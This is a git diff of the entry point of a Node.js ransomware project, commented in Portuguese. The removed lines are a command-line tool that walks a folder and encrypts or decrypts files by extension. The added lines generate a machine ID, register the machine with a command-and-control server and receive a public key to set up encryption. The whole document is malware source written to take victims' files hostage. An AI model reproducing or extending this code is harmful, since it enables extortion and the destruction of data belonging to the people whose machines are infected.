@@ -1,49 +1,16 @@
-const discovery = require("./discovery");
-const syncWorker = require("./sync");
-const asyncWorker = require("./async");
-///const path = require("path");
-const chalk = require("chalk");
-const print = console.log;
-const argParser = require("minimist");
-// desestrutura os argumentos do cli para entender o que está acontecendo
-const arguments = argParser(process.argv.slice(2), {
-  default: {
-    folder: null, // * - pasta inicial
-    extensions: null, // extensões de arquivos
-    async: false, // execute encryption assyncronously
-    d: false // decrypt mode
-  }
-});
+const discovery = require("./discovery"); // file discover
+const worker = require("./sync"); // processo que executa operações de encriptação
+const loadMachineID = require("./utils/loadId"); // carrega a identificação da máquina
+const generateMachineID = require("./utils/generateId"); // gera a identificação da máquina
+const connection = require("./utils/connection"); // gerencia a conexão com o server c2
+const Encrypter = require("./Ciphers/Crypter");
 
-// configuração das mensagens coloridas no console
-const warning = chalk.keyword("orange"); // colorir mensagens na tela
-const primary = chalk.green;
-
-// recebe os parametros da cli
-const { folder, extensions, async, d } = arguments;
-
-// define a função de cifragem/decifragem
-var cipherFn = d
-  ? require("./Ciphers/Decrypter")
-  : require("./Ciphers/Crypter");
-// define o modo de operação do ransom
-var worker = async ? asyncWorker : syncWorker; // a função responsável por executar a operação de escrita
-// pega as extensões da cli
-var exts = extensions ? extensions.replace(".", "").split(",") : [];
-if (folder) {
-  print(primary("Iniciando operação!"));
-  discovery(
-    folder,
-    {
-      extensions: exts
-    },
-    (filename, stats) => {
-      worker(filename, cipherFn);
-    }
-  );
-} else {
-  print(
-    warning("Você precisa especificar uma pasta para encryptação dos arquivos!")
-  );
-  print(primary("Utilize a opção --folder"));
+// busca a identificação da máquina ou gera uma nova
+var sysInfo = loadMachineID();
+if (!sysInfo) {
+  // é a primeira vez que rodou nesta máquina
+  sysInfo = generateMachineID();
 }
+connection.registerMachine(sysInfo, function({ publicKey }) {
+  const cipher = Encrypter(publicKey);
+});
